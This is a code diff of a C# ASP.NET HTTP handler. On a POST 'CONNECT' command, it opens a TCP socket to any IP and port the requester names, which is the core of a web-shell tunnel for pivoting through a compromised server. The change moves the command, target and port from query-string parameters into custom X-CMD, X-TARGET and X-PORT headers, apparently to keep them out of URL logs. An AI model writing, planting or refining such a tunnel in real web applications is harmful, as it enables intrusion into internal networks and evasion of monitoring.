@@ -13,13 +13,13 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
         {
             if (context.Request.HttpMethod == "POST")
             {
-                String cmd = context.Request.QueryString.Get("cmd").ToUpper();
+                String cmd = context.Request.Headers.Get("X-CMD").ToUpper();
                 if (cmd == "CONNECT")
                 {
                     try
                     {
-                        String target = context.Request.QueryString.Get("target").ToUpper();
-                        int port = int.Parse(context.Request.QueryString.Get("port"));
+                        String target = context.Request.Headers.Get("X-TARGET").ToUpper();
+                        int port = int.Parse(context.Request.Headers.Get("X-PORT"));
                         IPAddress ip = IPAddress.Parse(target);
                         System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
                         Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
